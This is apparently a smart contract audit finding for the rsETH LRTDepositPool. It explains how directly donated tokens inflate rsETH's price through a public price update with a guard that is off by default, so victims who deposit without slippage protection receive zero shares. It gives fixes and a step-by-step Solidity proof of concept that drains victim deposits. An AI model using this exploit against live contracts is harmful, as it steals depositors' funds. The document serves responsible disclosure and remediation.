Audit Report

## Title
rsETH Price Inflation via Direct Token Donation to `LRTDepositPool` - (File: contracts/LRTDepositPool.sol)

## Summary
`LRTDepositPool.getAssetDistributionData()` uses raw `IERC20(asset).balanceOf(address(this))` to measure assets held in the pool, meaning tokens transferred directly (without calling `depositAsset()`) inflate `getTotalAssetDeposits()`. When `updateRSETHPrice()` is called, the inflated balance raises `rsETHPrice` without increasing `rsethSupply`, causing subsequent depositors who pass `minRSETHAmountExpected = 0` to receive zero rsETH while their full deposit is absorbed into the pool. The attacker, holding the only outstanding rsETH, redeems it for the original donation plus all victim deposits.

## Finding Description

`getAssetDistributionData()` measures the pool's share of any LST using the raw ERC-20 balance:

```solidity
// contracts/LRTDepositPool.sol L444
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
```

For ETH the same pattern applies at L480:
```solidity
ethLyingInDepositPool = address(this).balance;
```

`getTotalAssetDeposits()` (L385–396) sums `assetLyingInDepositPool` with NDC and EigenLayer balances and returns the total. `LRTOracle._getTotalEthInProtocol()` (L341–343) calls this for every supported asset and multiplies by the asset price. `_updateRsETHPrice()` (L250) then divides by `rsethSupply`:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

`updateRSETHPrice()` (L87) is `public whenNotPaused`, callable by any address. The price-increase guard (L256–257) is:

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```

Because `pricePercentageLimit` defaults to `0`, the condition is always `false` and the guard never fires, allowing an unbounded price increase in a single call.

`getRsETHAmountToMint()` (L520) divides by the stored price:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

`_beforeDeposit()` (L667–669) only reverts when `rsethAmountToMint < minRSETHAmountExpected`. With `minRSETHAmountExpected = 0`, a zero-mint result (`0 < 0` is false) passes silently and the depositor's assets are transferred to the pool with no rsETH issued.

## Impact Explanation

**Critical — Direct theft of user funds.** A victim who deposits with `minRSETHAmountExpected = 0` loses their entire deposit permanently: the assets enter the pool, inflate the backing per rsETH share, and are fully redeemable by the attacker who holds the only outstanding rsETH. There is no recovery path once the deposit transaction confirms.

## Likelihood Explanation

**Medium-High.** The attack requires: (1) the attacker to hold enough LST to donate proportional to the target deposit; (2) `pricePercentageLimit == 0`, which is the default storage value at deployment; (3) at least one victim to call `depositAsset` with `minRSETHAmountExpected = 0`. Condition 3 is realistic — many integrations, scripts, and early depositors omit slippage protection. The attack is most dangerous at protocol launch when `rsethSupply` is near zero and price sensitivity to donations is highest. It is repeatable across multiple victims.

## Recommendation

1. Replace `balanceOf(address(this))` with an internal deposit ledger that tracks only assets received through `depositAsset()` / `depositETH()`, so direct transfers are never counted as protocol TVL.
2. Alternatively, adopt a virtual-shares offset (OZ ERC-4626 v4.9 style) so a donation of size `D` requires the attacker to lose `D / (1 + virtualShares)` to the protocol, making the attack unprofitable.
3. At minimum, enforce `rsethAmountToMint > 0` unconditionally in `_beforeDeposit()` (not just relative to `minRSETHAmountExpected`), and ensure `pricePercentageLimit` is set to a safe non-zero value before the first public deposit.

## Proof of Concept

```solidity
// Preconditions: rsethSupply = 0, rsETHPrice = 1e18, pricePercentageLimit = 0

// Step 1 — Attacker seeds pool with 1 wei stETH → receives 1 wei rsETH
vm.startPrank(attacker);
stETH.approve(address(lrtDepositPool), 1);
lrtDepositPool.depositAsset(address(stETH), 1, 0, "");
// rsethSupply = 1, rsETHPrice = 1e18

// Step 2 — Attacker donates X stETH directly (no depositAsset)
stETH.transfer(address(lrtDepositPool), X);
// balanceOf(lrtDepositPool) = 1 + X, rsethSupply still = 1

// Step 3 — Attacker triggers price update (public, no access control)
lrtOracle.updateRSETHPrice();
// pricePercentageLimit == 0 → guard bypassed
// newRsETHPrice ≈ (1 + X) * 1e18
vm.stopPrank();

// Step 4 — Victim deposits Y stETH with no slippage protection
vm.startPrank(victim);
stETH.approve(address(lrtDepositPool), Y);
lrtDepositPool.depositAsset(address(stETH), Y, 0 /* minRSETHAmountExpected = 0 */, "");
// rsethAmountToMint = Y * 1e18 / ((1+X)*1e18) = Y/(1+X) → 0 when X >> Y
// 0 < 0 is false → _beforeDeposit passes, victim receives 0 rsETH
vm.stopPrank();

// Step 5 — Attacker updates price to include victim deposit
vm.startPrank(attacker);
lrtOracle.updateRSETHPrice();
// newRsETHPrice ≈ (1 + X + Y) * 1e18

// Step 6 — Attacker redeems 1 wei rsETH
lrtWithdrawalManager.initiateWithdrawal(address(stETH), 1);
// expectedAssetAmount = 1 * rsETHPrice / assetPrice = 1 + X + Y stETH
// Attacker recovers donation X + victim deposit Y + original 1 wei
vm.stopPrank();
```